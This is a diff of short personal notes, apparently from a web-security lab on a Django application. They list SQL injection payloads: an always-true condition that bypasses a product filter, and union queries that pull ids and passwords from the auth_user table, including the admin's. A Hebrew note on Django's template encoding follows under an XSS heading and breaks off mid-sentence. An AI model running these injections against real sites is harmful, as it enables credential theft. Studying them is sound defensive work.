@@ -13,9 +13,12 @@ Aa12354678!
 SELECT * FROM products WHERE category = '' or '1' = '1'--' AND released = 1
 
 
+' 
+
+
 signup sqli:
 ' union select id,password from auth_user -- - ASFSA
-
+union select id,password from auth_user where username='admin'-- - ASFSA
 
 XSS:
 django משתמש בקידוד unicode ובUTF-8  ביי דיפולט בכל מקום והוא מאלץ קידוד לפני ביצוע החלפה\המרה במשתנים בטמפלייטס אבל היא עדיין נותנת למפתחים אופציה לשנות את הקידוד כמו למשל:
